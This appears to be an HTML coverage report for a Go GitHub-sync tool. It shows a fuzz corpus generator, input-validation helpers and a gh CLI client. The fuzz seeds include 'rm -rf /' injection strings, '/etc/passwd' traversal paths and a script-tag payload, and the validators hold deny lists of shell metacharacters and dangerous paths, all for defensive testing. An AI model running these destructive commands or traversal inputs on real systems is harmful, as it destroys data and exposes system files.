                {"pr", "create", "--title", "Test\r\nCRLF"},

                // Unicode
                {"pr", "create", "--title", "–¢–µ—Å—Ç"},
                {"pr", "create", "--title", "ÊµãËØï"},
                {"pr", "create", "--title", "üéâüéäüéà"},

                // Edge cases
                {},
                {""},
                {strings.Repeat("a", 1000)},
        }

        // Convert to JSON strings
        corpus := []string{}
        for _, args := range cliArgs </span><span class="cov8" title="1">{
                if data, err := json.Marshal(args); err == nil </span><span class="cov8" title="1">{
                        corpus = append(corpus, string(data))
                }</span>
        }

        // Add JSON parsing test cases
        <span class="cov8" title="1">jsonCases := []string{
                // Valid JSON
                `{"name": "repo", "owner": {"login": "org"}}`,
                `{"name": "repo", "private": true, "description": "Test repo"}`,
                `[{"name": "repo1"}, {"name": "repo2"}]`,

                // Malformed JSON
                `{{{{{`,
                `{"name": "repo"`,
                `{"name": repo}`,
                `{'name': 'repo'}`, // Single quotes

                // Injection attempts
                `{"name": "repo\"; rm -rf /"}`,
                `{"script": "&lt;script&gt;alert(1)&lt;/script&gt;"}`,
                "{\"name\": \"" + "\x00" + "\"}",

                // Large/nested JSON
                "{\"data\": \"" + strings.Repeat("x", 10000) + "\"}",
                generateDeeplyNestedJSON(50),
        }

        corpus = append(corpus, jsonCases...)
        return g.saveCorpus("gh", corpus)</span>
}

// GenerateTransformCorpus generates test corpus for transform package
func (g *CorpusGenerator) GenerateTransformCorpus() error <span class="cov8" title="1">{
        // Template test cases
        templates := []struct {
                template string
                vars     map[string]string
        }{
                // Basic substitution
                {
                        template: "Hello {{NAME}}!",
                        vars:     map[string]string{"NAME": "World"},
                },
                // Multiple variables
                {
                        template: "{{GREETING}} {{NAME}}, welcome to {{PLACE}}",
                        vars:     map[string]string{"GREETING": "Hello", "NAME": "User", "PLACE": "Earth"},
                },
                // Path injection
                {
                        template: "Path: {{PATH}}",
                        vars:     map[string]string{"PATH": "../../../etc/passwd"},
                },
                // Command injection
                {
                        template: "Command: {{CMD}}",
                        vars:     map[string]string{"CMD": "; rm -rf /"},
                },
                // Recursive substitution
                {
                        template: "{{VAR1}}",
                        vars:     map[string]string{"VAR1": "{{VAR2}}", "VAR2": "{{VAR1}}"},
                },
                // Unicode
                {
                        template: "Unicode: {{EMOJI}}",
                        vars:     map[string]string{"EMOJI": "üéâüéäüéà"},
                },
                // Empty and edge cases
                {
                        template: "",
                        vars:     map[string]string{},
                },
                {
                        template: "{{}}",
                        vars:     map[string]string{"": "empty"},
                },
                {
                        template: "{{LONGVAR}}",
                        vars:     map[string]string{"LONGVAR": strings.Repeat("x", 1000)},
                },
                // Nested braces
                {
                        template: "{{ {{INNER}} }}",
                        vars:     map[string]string{"INNER": "value", "value": "nested"},
                },
                // Special characters in variable names
                {
                        template: "{{VAR-NAME}} {{VAR.NAME}} {{VAR NAME}}",
                        vars:     map[string]string{"VAR-NAME": "dash", "VAR.NAME": "dot", "VAR NAME": "space"},
                },
        }

        corpus := []string{}
        for _, tc := range templates </span><span class="cov8" title="1">{
                // Add template
                corpus = append(corpus, tc.template)
                // Add vars as JSON
                if data, err := json.Marshal(tc.vars); err == nil </span><span class="cov8" title="1">{
                        corpus = append(corpus, string(data))
                }</span>
        }

        // Regex test cases
        <span class="cov8" title="1">regexCases := []struct {
                pattern     string
                replacement string
                input       string
        }{
                // Valid regex
                {`\d+`, "NUM", "Replace 123 with NUM"},
                {`(hello) (world)`, "$2 $1", "hello world"},
                {`[aeiou]`, "*", "vowels"},

                // Invalid regex
                {`[`, "X", "invalid bracket"},
                {`(?P&lt;name&gt;`, "X", "incomplete group"},
                {`*+`, "X", "invalid quantifier"},

                // ReDoS patterns
                {`(a+)+`, "X", strings.Repeat("a", 100) + "b"},
                {`(.*)*`, "X", strings.Repeat("x", 100)},

                // Replacement injection
                {`.+`, "../etc/passwd", "replace all"},
                {`.+`, "$0; rm -rf /", "command injection"},

                // Special replacements
                {`(\w+)`, `$1$1$1`, "triple"},
                {`test`, `${1:-default}`, "bash-like"},
        }

        for _, tc := range regexCases </span><span class="cov8" title="1">{
                corpus = append(corpus, tc.pattern)
                corpus = append(corpus, tc.replacement)
                corpus = append(corpus, tc.input)
        }</span>

        <span class="cov8" title="1">return g.saveCorpus("transform", corpus)</span>
}

// saveCorpus saves corpus data to files
func (g *CorpusGenerator) saveCorpus(category string, corpus []string) error <span class="cov8" title="1">{
        dir := filepath.Join(g.BaseDir, "corpus", category)
        if err := os.MkdirAll(dir, 0o750); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to create corpus directory: %w", err)
        }</span>

        <span class="cov8" title="1">for i, data := range corpus </span><span class="cov8" title="1">{
                file := filepath.Join(dir, fmt.Sprintf("seed_%03d", i))
                if err := os.WriteFile(file, []byte(data), 0o600); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to write corpus file: %w", err)
                }</span>
        }

        <span class="cov8" title="1">return nil</span>
}

// generateDeeplyNested generates a deeply nested YAML structure
func generateDeeplyNested(depth int) string <span class="cov8" title="1">{
        var sb strings.Builder
        sb.WriteString("version: 1\n")
        sb.WriteString("source:\n")
        sb.WriteString("  repo: org/repo\n")
        sb.WriteString("targets:\n")

        indent := "  "
        for i := 0; i &lt; depth; i++ </span><span class="cov8" title="1">{
                sb.WriteString(indent + "- repo: nested/repo" + fmt.Sprintf("%d", i) + "\n")
                sb.WriteString(indent + "  files:\n")
                indent += "    "
        }</span>

        <span class="cov8" title="1">return sb.String()</span>
}

// generateDeeplyNestedJSON generates deeply nested JSON
func generateDeeplyNestedJSON(depth int) string <span class="cov8" title="1">{
        var sb strings.Builder
        for i := 0; i &lt; depth; i++ </span><span class="cov8" title="1">{
                sb.WriteString(`{"level":`)
        }</span>
        <span class="cov8" title="1">sb.WriteString(`"bottom"`)
        for i := 0; i &lt; depth; i++ </span><span class="cov8" title="1">{
                sb.WriteString(`}`)
        }</span>
        <span class="cov8" title="1">return sb.String()</span>
}
</pre>

		<pre class="file" id="file27" style="display: none">// Package fuzz provides fuzzing utilities and security validation helpers
package fuzz

import (
        "strings"
        "unicode"
        "unicode/utf8"
)

// ContainsShellMetachars checks for shell metacharacters that could lead to command injection
func ContainsShellMetachars(s string) bool <span class="cov8" title="1">{
        metachars := []string{";", "&amp;", "|", "`", "$", "(", ")", "{", "}", "&lt;", "&gt;", "\\", "'", "\"", "\n", "\r", "\t"}
        for _, char := range metachars </span><span class="cov8" title="1">{
                if strings.Contains(s, char) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        // Check for null bytes
        <span class="cov8" title="1">if strings.Contains(s, "\x00") </span><span class="cov8" title="1">{
                return true
        }</span>
        <span class="cov8" title="1">return false</span>
}

// ContainsPathTraversal checks for path traversal attempts
func ContainsPathTraversal(path string) bool <span class="cov8" title="1">{
        dangerous := []string{
                "..", "../", "..\\",
                "/..", "\\..",
                "/etc/", "\\windows\\",
                "/dev/", "/proc/",
                "/sys/", "\\system32\\",
                "~", "$HOME", "%HOME%",
                "${", "%{",
        }
        pathLower := strings.ToLower(path)
        for _, pattern := range dangerous </span><span class="cov8" title="1">{
                if strings.Contains(pathLower, strings.ToLower(pattern)) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        // Check for absolute paths
        <span class="cov8" title="1">if len(path) &gt; 0 &amp;&amp; (path[0] == '/' || path[0] == '\\') </span><span class="cov8" title="1">{
                return true
        }</span>
        // Check for Windows drive letters
        <span class="cov8" title="1">if len(path) &gt;= 2 &amp;&amp; path[1] == ':' </span><span class="cov8" title="1">{
                return true
        }</span>
        <span class="cov8" title="1">return false</span>
}

// IsValidUTF8 validates UTF-8 encoding and checks for problematic characters
func IsValidUTF8(s string) bool <span class="cov8" title="1">{
        if !utf8.ValidString(s) </span><span class="cov0" title="0">{
                return false
        }</span>
        <span class="cov8" title="1">for _, r := range s </span><span class="cov8" title="1">{
                // Check for replacement character
                if r == unicode.ReplacementChar </span><span class="cov8" title="1">{
                        return false
                }</span>
                // Check for control characters (except common ones like \n, \r, \t)
                <span class="cov8" title="1">if unicode.IsControl(r) &amp;&amp; r != '\n' &amp;&amp; r != '\r' &amp;&amp; r != '\t' </span><span class="cov8" title="1">{
                        return false
                }</span>
        }
        <span class="cov8" title="1">return true</span>
}

// ContainsURLMetachars checks for characters that could lead to URL injection
func ContainsURLMetachars(url string) bool <span class="cov8" title="1">{
        // Check for common URL injection patterns
        dangerous := []string{
                "javascript:", "data:", "vbscript:",
                "file://", "dict://", "gopher://",
                "../", "..\\",
                "%00", "%0a", "%0d",
                "\r", "\n", "\t",
        }
        urlLower := strings.ToLower(url)
        for _, pattern := range dangerous </span><span class="cov8" title="1">{
                if strings.Contains(urlLower, pattern) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

// IsSafeBranchName checks if a branch name is safe for git operations
func IsSafeBranchName(branch string) bool <span class="cov8" title="1">{
        if branch == "" </span><span class="cov8" title="1">{
                return false
        }</span>
        // Check for shell metacharacters
        <span class="cov8" title="1">if ContainsShellMetachars(branch) </span><span class="cov8" title="1">{
                return true // unsafe
        }</span>
        // Check for git-specific dangerous patterns
        <span class="cov8" title="1">dangerous := []string{
                "..", "~", "^", ":", "\\",
                "@{", ".lock", " ", "\t",
        }
        for _, pattern := range dangerous </span><span class="cov8" title="1">{
                if strings.Contains(branch, pattern) </span><span class="cov8" title="1">{
                        return false
                }</span>
        }
        // Check if it starts with dash (could be interpreted as flag)
        <span class="cov8" title="1">if strings.HasPrefix(branch, "-") </span><span class="cov8" title="1">{
                return false
        }</span>
        <span class="cov8" title="1">return true</span>
}

// IsSafeRepoName checks if a repository name follows safe patterns
func IsSafeRepoName(repo string) bool <span class="cov8" title="1">{
        // Basic format check
        parts := strings.Split(repo, "/")
        if len(parts) != 2 </span><span class="cov8" title="1">{
                return false
        }</span>
        // Both parts should be non-empty
        <span class="cov8" title="1">if parts[0] == "" || parts[1] == "" </span><span class="cov8" title="1">{
                return false
        }</span>
        // Check for dangerous patterns
        <span class="cov8" title="1">if ContainsShellMetachars(repo) </span><span class="cov0" title="0">{
                return false
        }</span>
        <span class="cov8" title="1">if ContainsPathTraversal(repo) </span><span class="cov0" title="0">{
                return false
        }</span>
        // Check for suspicious extensions that might indicate path injection
        <span class="cov8" title="1">suspicious := []string{".git", ".ssh", ".config", ".bash", ".sh"}
        repoLower := strings.ToLower(repo)
        for _, ext := range suspicious </span><span class="cov8" title="1">{
                if strings.HasSuffix(repoLower, ext) </span><span class="cov8" title="1">{
                        return false
                }</span>
        }
        <span class="cov8" title="1">return true</span>
}

// HasExcessiveLength checks if input exceeds reasonable bounds
func HasExcessiveLength(s string, maxLen int) bool <span class="cov8" title="1">{
        return len(s) &gt; maxLen
}</span>

// ContainsNullByte checks for null byte injection
func ContainsNullByte(s string) bool <span class="cov8" title="1">{
        return strings.Contains(s, "\x00")
}</span>
</pre>

		<pre class="file" id="file28" style="display: none">package gh

import (
        "bytes"
        "context"
        "os/exec"
        "time"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/logging"
)

// CommandRunner interface for executing system commands
type CommandRunner interface {
        Run(ctx context.Context, name string, args ...string) ([]byte, error)
        RunWithInput(ctx context.Context, input []byte, name string, args ...string) ([]byte, error)
}

// realCommandRunner executes actual system commands
type realCommandRunner struct {
        logger    *logrus.Logger
        logConfig *logging.LogConfig
}

// NewCommandRunner creates a new command runner.
//
// Parameters:
// - logger: Logger instance for general logging
// - logConfig: Configuration for debug logging and verbose settings
//
// Returns:
// - CommandRunner interface implementation for executing system commands
func NewCommandRunner(logger *logrus.Logger, logConfig *logging.LogConfig) CommandRunner <span class="cov8" title="1">{
        return &amp;realCommandRunner{
                logger:    logger,
                logConfig: logConfig,
        }
}</span>

// Run executes a command and returns its output
func (r *realCommandRunner) Run(ctx context.Context, name string, args ...string) ([]byte, error) <span class="cov8" title="1">{
        return r.RunWithInput(ctx, nil, name, args...)
}</span>

// RunWithInput executes a command with input and returns its output.
//
// This method provides detailed visibility into GitHub CLI command execution when
// API debug logging is enabled, including request details, timing, response size,
// and selective response body logging for troubleshooting.
//
// Parameters:
// - ctx: Context for cancellation and timeout control
// - input: Optional input data to pass to the command
// - name: Command name to execute
// - args: Command arguments
//
// Returns:
// - Command output as byte slice
// - Error if command execution fails
//
// Side Effects:
// - Logs detailed request/response information when --debug-api flag is enabled
// - Records command timing and response size metrics
func (r *realCommandRunner) RunWithInput(ctx context.Context, input []byte, name string, args ...string) ([]byte, error) <span class="cov8" title="1">{
        cmd := exec.CommandContext(ctx, name, args...)
        logger := logging.WithStandardFields(r.logger, r.logConfig, logging.ComponentNames.API)

        // Debug logging when --debug-api flag is enabled
        if r.logConfig != nil &amp;&amp; r.logConfig.Debug.API </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        logging.StandardFields.Operation: logging.OperationTypes.APIRequest,
                        "args":                           args,
                        logging.StandardFields.Timestamp: time.Now().Format(time.RFC3339),
                }).Debug("GitHub CLI request")

                // Log request body/input if present
                if input != nil </span><span class="cov8" title="1">{
                        logger.WithFields(logrus.Fields{
                                logging.StandardFields.ContentSize: len(input),
                                "input":                            string(input),
                        }).Trace("Request input")
                }</span>

                // Log request field parsing for GitHub CLI -f parameters
                <span class="cov8" title="1">for i, arg := range args </span><span class="cov8" title="1">{
                        if arg == "-f" &amp;&amp; i+1 &lt; len(args) </span><span class="cov8" title="1">{
                                logger.WithField("field", args[i+1]).Trace("Request field")
                        }</span>
                }
        } else<span class="cov8" title="1"> if r.logger != nil &amp;&amp; r.logger.IsLevelEnabled(logrus.DebugLevel) </span><span class="cov8" title="1">{
                // Basic logging for backwards compatibility
                r.logger.WithFields(logrus.Fields{
                        "command": name,
                        "args":    args,
                }).Debug("Executing command")
        }</span>

        <span class="cov8" title="1">var stdout, stderr bytes.Buffer

        cmd.Stdout = &amp;stdout
        cmd.Stderr = &amp;stderr

        if input != nil </span><span class="cov8" title="1">{
                cmd.Stdin = bytes.NewReader(input)
        }</span>

        // Execute command with timing
        <span class="cov8" title="1">start := time.Now()
        err := cmd.Run()
        duration := time.Since(start)

        // Response logging when --debug-api flag is enabled
        if r.logConfig != nil &amp;&amp; r.logConfig.Debug.API </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        logging.StandardFields.DurationMs:  duration.Milliseconds(),
                        logging.StandardFields.ContentSize: stdout.Len(),
                        logging.StandardFields.Error:       err,
                        logging.StandardFields.Status:      "response_received",
                }).Debug("GitHub CLI response")

                // Log response body for small responses (with size limits)
                if err == nil &amp;&amp; stdout.Len() &gt; 0 &amp;&amp; stdout.Len() &lt; 1024 </span><span class="cov8" title="1">{
                        logger.WithField("response", stdout.String()).Trace("Response body")
                }</span>

                // Log stderr for debugging even on success
                <span class="cov8" title="1">if stderr.Len() &gt; 0 </span><span class="cov0" title="0">{
                        logger.WithField("stderr", stderr.String()).Trace("Response stderr")
                }</span>
        }

        <span class="cov8" title="1">if err != nil </span><span class="cov8" title="1">{
                // Include stderr in error message for better debugging
                if stderr.Len() &gt; 0 </span><span class="cov8" title="1">{
                        if r.logger != nil </span><span class="cov8" title="1">{
                                if r.logConfig != nil &amp;&amp; r.logConfig.Debug.API </span><span class="cov0" title="0">{
                                        // Error logging with timing context
                                        logger.WithFields(logrus.Fields{
                                                "command":                         name,
                                                "args":                            args,
                                                "stderr":                          stderr.String(),
                                                logging.StandardFields.DurationMs: duration.Milliseconds(),
                                                logging.StandardFields.Status:     "failed",
                                        }).Error("GitHub CLI command failed")
                                }</span> else<span class="cov8" title="1"> {
                                        // Basic error logging for backwards compatibility
                                        r.logger.WithFields(logrus.Fields{
                                                logging.StandardFields.Component: logging.ComponentNames.API,
                                                "command":                        name,
                                                "args":                           args,
                                                "stderr":                         stderr.String(),
                                                logging.StandardFields.Status:    "failed",
                                        }).Error("Command failed")
                                }</span>
                        }
                        <span class="cov8" title="1">return nil, &amp;CommandError{
                                Command: name,
                                Args:    args,
                                Stderr:  stderr.String(),
                                Err:     err,
                        }</span>
                }
                <span class="cov8" title="1">return nil, err</span>
        }

        // Log successful completion
        <span class="cov8" title="1">if r.logConfig == nil || !r.logConfig.Debug.API </span><span class="cov8" title="1">{
                // Basic logging for backwards compatibility
                if r.logger != nil &amp;&amp; r.logger.IsLevelEnabled(logrus.DebugLevel) </span><span class="cov8" title="1">{
                        r.logger.WithFields(logrus.Fields{
                                "command": name,
                                "args":    args,
                                "output":  stdout.String(),
                        }).Debug("Command completed successfully")
                }</span>
        }

        <span class="cov8" title="1">return stdout.Bytes(), nil</span>
}

// CommandError provides detailed error information from command execution
type CommandError struct {
        Command string
        Args    []string
        Stderr  string
        Err     error
}

func (e *CommandError) Error() string <span class="cov8" title="1">{
        return e.Stderr
}</span>

func (e *CommandError) Unwrap() error <span class="cov8" title="1">{
        return e.Err
}</span>
</pre>

		<pre class="file" id="file29" style="display: none">package gh

import (
        "context"

        "github.com/stretchr/testify/mock"
)

// MockCommandRunner is a mock implementation of CommandRunner
type MockCommandRunner struct {
        mock.Mock
}

// NewMockCommandRunner creates a new MockCommandRunner (backward compatibility)
func NewMockCommandRunner() *MockCommandRunner <span class="cov0" title="0">{
        return &amp;MockCommandRunner{}
}</span>

// Run mocks command execution
func (m *MockCommandRunner) Run(ctx context.Context, name string, args ...string) ([]byte, error) <span class="cov8" title="1">{
        called := m.Called(ctx, name, args)
        if called.Get(0) == nil </span><span class="cov8" title="1">{
                return nil, called.Error(1)
        }</span>
        <span class="cov8" title="1">return called.Get(0).([]byte), called.Error(1)</span>
}

// RunWithInput mocks command execution with input
func (m *MockCommandRunner) RunWithInput(ctx context.Context, input []byte, name string, args ...string) ([]byte, error) <span class="cov8" title="1">{
        called := m.Called(ctx, input, name, args)
        if called.Get(0) == nil </span><span class="cov8" title="1">{
                return nil, called.Error(1)
        }</span>
        <span class="cov8" title="1">return called.Get(0).([]byte), called.Error(1)</span>
}
</pre>

		<pre class="file" id="file30" style="display: none">package gh

import (
        "context"
        "encoding/base64"
        "errors"
        "fmt"
        "os/exec"
        "strings"

        "github.com/sirupsen/logrus"

        appErrors "github.com/mrz1836/go-broadcast/internal/errors"
        "github.com/mrz1836/go-broadcast/internal/jsonutil"
        "github.com/mrz1836/go-broadcast/internal/logging"
)

// Common errors
var (
        ErrNotAuthenticated = errors.New("gh CLI not authenticated")
        ErrGHNotFound       = errors.New("gh CLI not found in PATH")
        ErrRateLimited      = errors.New("GitHub API rate limit exceeded")
        ErrBranchNotFound   = errors.New("branch not found")
        ErrPRNotFound       = errors.New("pull request not found")
        ErrFileNotFound     = errors.New("file not found")
        ErrCommitNotFound   = errors.New("commit not found")
        ErrGitTreeNotFound  = errors.New("git tree not found")
)

// githubClient implements the Client interface using gh CLI
type githubClient struct {
        runner      CommandRunner
        logger      *logrus.Logger
        currentUser *User // Cache for current user
}

// NewClient creates a new GitHub client using gh CLI.
//
// Parameters:
// - ctx: Context for authentication check and cancellation
// - logger: Logger instance for general logging
// - logConfig: Configuration for debug logging and verbose settings
//
// Returns:
// - GitHub client interface implementation
// - Error if gh CLI is not available or not authenticated
func NewClient(ctx context.Context, logger *logrus.Logger, logConfig *logging.LogConfig) (Client, error) <span class="cov8" title="1">{
        // Initialize audit logger for security event tracking
        auditLogger := logging.NewAuditLogger()

        // Check if gh is available
        if _, err := exec.LookPath("gh"); err != nil </span><span class="cov8" title="1">{
                auditLogger.LogAuthentication("system", "github_cli", false)
                return nil, ErrGHNotFound
        }</span>

        <span class="cov8" title="1">runner := NewCommandRunner(logger, logConfig)

        // Check authentication status
        if _, err := runner.Run(ctx, "gh", "auth", "status"); err != nil </span><span class="cov8" title="1">{
                auditLogger.LogAuthentication("unknown", "github_cli", false)
                return nil, fmt.Errorf("%w: gh auth status failed", ErrNotAuthenticated)
        }</span>

        // Log successful authentication
        <span class="cov8" title="1">auditLogger.LogAuthentication("github_cli", "github_token", true)

        return &amp;githubClient{
                runner:      runner,
                logger:      logger,
                currentUser: nil,
        }, nil</span>
}

// ListBranches returns all branches for a repository
func (g *githubClient) ListBranches(ctx context.Context, repo string) ([]Branch, error) <span class="cov8" title="1">{
        output, err := g.runner.Run(ctx, "gh", "api", fmt.Sprintf("repos/%s/branches", repo), "--paginate")
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "list branches")
        }</span>

        <span class="cov8" title="1">branches, err := jsonutil.UnmarshalJSON[[]Branch](output)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "parse branches")
        }</span>

        <span class="cov8" title="1">return branches, nil</span>
}

// GetBranch returns details for a specific branch
func (g *githubClient) GetBranch(ctx context.Context, repo, branch string) (*Branch, error) <span class="cov8" title="1">{
        output, err := g.runner.Run(ctx, "gh", "api", fmt.Sprintf("repos/%s/branches/%s", repo, branch))
        if err != nil </span><span class="cov8" title="1">{
                if isNotFoundError(err) </span><span class="cov8" title="1">{
                        return nil, ErrBranchNotFound
                }</span>
                <span class="cov8" title="1">return nil, appErrors.WrapWithContext(err, "get branch")</span>
        }

        <span class="cov8" title="1">b, err := jsonutil.UnmarshalJSON[Branch](output)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "parse branch")
        }</span>

        <span class="cov8" title="1">return &amp;b, nil</span>
}

// CreatePR creates a new pull request
func (g *githubClient) CreatePR(ctx context.Context, repo string, req PRRequest) (*PR, error) <span class="cov8" title="1">{
        // Initialize audit logger for security event tracking
        auditLogger := logging.NewAuditLogger()

        // Extract owner from repo (format: owner/repo)
        parts := strings.Split(repo, "/")
        if len(parts) != 2 </span><span class="cov0" title="0">{
                return nil, appErrors.WrapWithContext(appErrors.FormatError("repository", repo, "owner/repo"), "parse repo")
        }</span>
        <span class="cov8" title="1">owner := parts[0]

        // Format head branch with owner prefix for cross-repository PRs
        headRef := req.Head
        if !strings.Contains(headRef, ":") </span><span class="cov8" title="1">{
                headRef = fmt.Sprintf("%s:%s", owner, req.Head)
        }</span>

        // Create PR using gh api
        <span class="cov8" title="1">prData := map[string]interface{}{
                "title": req.Title,
                "body":  req.Body,
                "head":  headRef,
                "base":  req.Base,
        }

        jsonData, err := jsonutil.MarshalJSON(prData)
        if err != nil </span><span class="cov0" title="0">{
                return nil, appErrors.WrapWithContext(err, "marshal PR data")
        }</span>

        <span class="cov8" title="1">output, err := g.runner.RunWithInput(ctx, jsonData, "gh", "api", fmt.Sprintf("repos/%s/pulls", repo), "--method", "POST", "--input", "-")
        if err != nil </span><span class="cov8" title="1">{
                // Log failed repository access
                auditLogger.LogRepositoryAccess("github_cli", repo, "pr_create_failed")
                return nil, appErrors.WrapWithContext(fmt.Errorf("failed to create PR with head '%s' and base '%s': %w", headRef, req.Base, err), "create PR")
        }</span>

        <span class="cov8" title="1">pr, err := jsonutil.UnmarshalJSON[PR](output)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "parse PR response")
        }</span>

        // Log successful repository access for PR creation
        <span class="cov8" title="1">auditLogger.LogRepositoryAccess("github_cli", repo, "pr_create")

        // Set assignees if provided
        if len(req.Assignees) &gt; 0 </span><span class="cov8" title="1">{
                if err := g.setAssignees(ctx, repo, pr.Number, req.Assignees); err != nil </span><span class="cov8" title="1">{
                        g.logger.WithError(err).Warn("Failed to set PR assignees")
                }</span>
        }

        // Set reviewers if provided
        <span class="cov8" title="1">if len(req.Reviewers) &gt; 0 || len(req.TeamReviewers) &gt; 0 </span><span class="cov8" title="1">{
                if err := g.setReviewers(ctx, repo, pr.Number, req.Reviewers, req.TeamReviewers); err != nil </span><span class="cov0" title="0">{
                        g.logger.WithError(err).Warn("Failed to set PR reviewers")
                }</span>
        }

        <span class="cov8" title="1">return &amp;pr, nil</span>
}

// setAssignees sets assignees for a pull request
func (g *githubClient) setAssignees(ctx context.Context, repo string, prNumber int, assignees []string) error <span class="cov8" title="1">{
        assigneeData := map[string]interface{}{
                "assignees": assignees,
        }

        jsonData, err := jsonutil.MarshalJSON(assigneeData)
        if err != nil </span><span class="cov0" title="0">{
                return appErrors.WrapWithContext(err, "marshal assignee data")
        }</span>

        <span class="cov8" title="1">_, err = g.runner.RunWithInput(ctx, jsonData, "gh", "api", fmt.Sprintf("repos/%s/issues/%d/assignees", repo, prNumber), "--method", "POST", "--input", "-")
        if err != nil </span><span class="cov8" title="1">{
                return appErrors.WrapWithContext(err, "set PR assignees")
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// setReviewers sets reviewers and team reviewers for a pull request
func (g *githubClient) setReviewers(ctx context.Context, repo string, prNumber int, reviewers, teamReviewers []string) error <span class="cov8" title="1">{
        reviewerData := map[string]interface{}{}

        if len(reviewers) &gt; 0 </span><span class="cov8" title="1">{
                reviewerData["reviewers"] = reviewers
        }</span>

        <span class="cov8" title="1">if len(teamReviewers) &gt; 0 </span><span class="cov8" title="1">{
                reviewerData["team_reviewers"] = teamReviewers
        }</span>

        <span class="cov8" title="1">jsonData, err := jsonutil.MarshalJSON(reviewerData)
        if err != nil </span><span class="cov0" title="0">{
                return appErrors.WrapWithContext(err, "marshal reviewer data")
        }</span>

        <span class="cov8" title="1">_, err = g.runner.RunWithInput(ctx, jsonData, "gh", "api", fmt.Sprintf("repos/%s/pulls/%d/requested_reviewers", repo, prNumber), "--method", "POST", "--input", "-")
        if err != nil </span><span class="cov0" title="0">{
                return appErrors.WrapWithContext(err, "set PR reviewers")
        }</span>

        <span class="cov8" title="1">return nil</span>
}

// GetPR retrieves a pull request by number
func (g *githubClient) GetPR(ctx context.Context, repo string, number int) (*PR, error) <span class="cov8" title="1">{
        output, err := g.runner.Run(ctx, "gh", "api", fmt.Sprintf("repos/%s/pulls/%d", repo, number))
        if err != nil </span><span class="cov8" title="1">{
                if isNotFoundError(err) </span><span class="cov8" title="1">{
                        return nil, ErrPRNotFound
                }</span>
                <span class="cov8" title="1">return nil, appErrors.WrapWithContext(err, "get PR")</span>
        }

        <span class="cov8" title="1">pr, err := jsonutil.UnmarshalJSON[PR](output)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "parse PR")
        }</span>

        <span class="cov8" title="1">return &amp;pr, nil</span>
}

// ListPRs lists pull requests for a repository
func (g *githubClient) ListPRs(ctx context.Context, repo, state string) ([]PR, error) <span class="cov8" title="1">{
        apiURL := fmt.Sprintf("repos/%s/pulls", repo)
        if state != "" &amp;&amp; state != "all" </span><span class="cov8" title="1">{
                apiURL += fmt.Sprintf("?state=%s", state)
        }</span>

        <span class="cov8" title="1">args := []string{"api", apiURL, "--paginate"}

        output, err := g.runner.Run(ctx, "gh", args...)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "list PRs")
        }</span>

        <span class="cov8" title="1">prs, err := jsonutil.UnmarshalJSON[[]PR](output)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "parse PRs")
        }</span>

        <span class="cov8" title="1">return prs, nil</span>
}

// GetFile retrieves file contents from a repository
func (g *githubClient) GetFile(ctx context.Context, repo, path, ref string) (*FileContent, error) <span class="cov8" title="1">{
        url := fmt.Sprintf("repos/%s/contents/%s", repo, path)
        if ref != "" </span><span class="cov8" title="1">{
                url += fmt.Sprintf("?ref=%s", ref)
        }</span>

        <span class="cov8" title="1">output, err := g.runner.Run(ctx, "gh", "api", url)
        if err != nil </span><span class="cov8" title="1">{
                if isNotFoundError(err) </span><span class="cov8" title="1">{
                        return nil, ErrFileNotFound
                }</span>
                <span class="cov8" title="1">return nil, appErrors.WrapWithContext(err, "get file")</span>
        }

        <span class="cov8" title="1">file, unmarshalErr := jsonutil.UnmarshalJSON[File](output)
        if unmarshalErr != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(unmarshalErr, "parse file")
        }</span>

        // Decode base64 content
        <span class="cov8" title="1">content, err := base64.StdEncoding.DecodeString(strings.TrimSpace(file.Content))
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "decode file content")
        }</span>

        <span class="cov8" title="1">return &amp;FileContent{
                Path:    file.Path,
                Content: content,
                SHA:     file.SHA,
        }, nil</span>
}

// GetCommit retrieves commit details
func (g *githubClient) GetCommit(ctx context.Context, repo, sha string) (*Commit, error) <span class="cov8" title="1">{
        output, err := g.runner.Run(ctx, "gh", "api", fmt.Sprintf("repos/%s/commits/%s", repo, sha))
        if err != nil </span><span class="cov8" title="1">{
                if isNotFoundError(err) </span><span class="cov8" title="1">{
                        return nil, ErrCommitNotFound
                }</span>
                <span class="cov8" title="1">return nil, appErrors.WrapWithContext(err, "get commit")</span>
        }

        <span class="cov8" title="1">commit, err := jsonutil.UnmarshalJSON[Commit](output)
        if err != nil </span><span class="cov8" title="1">{
                return nil, appErrors.WrapWithContext(err, "parse commit")
        }</span>

        <span class="cov8" title="1">return &amp;commit, nil</span>
}

// ClosePR closes a pull request with an optional comment
func (g *githubClient) ClosePR(ctx context.Context, repo string, number int, comment string) error <span class="cov8" title="1">{
        // First, add a comment if provided
        if comment != "" </span><span class="cov8" title="1">{
                if err := g.addPRComment(ctx, repo, number, comment); err != nil </span><span class="cov0" title="0">{
                        g.logger.WithError(err).Warn("Failed to add comment before closing PR")
                }</span>
        }

        // Close the PR by updating its state
        <span class="cov8" title="1">closed := "closed"
        updates := PRUpdate{
                State: &amp;closed,
        }

        return g.UpdatePR(ctx, repo, number, updates)</span>
}

// DeleteBranch deletes a branch from the repository
func (g *githubClient) DeleteBranch(ctx context.Context, repo, branch string) error <span class="cov8" title="1">{
        _, err := g.runner.Run(ctx, "gh", "api", fmt.Sprintf("repos/%s/git/refs/heads/%s", repo, branch), "--method", "DELETE")
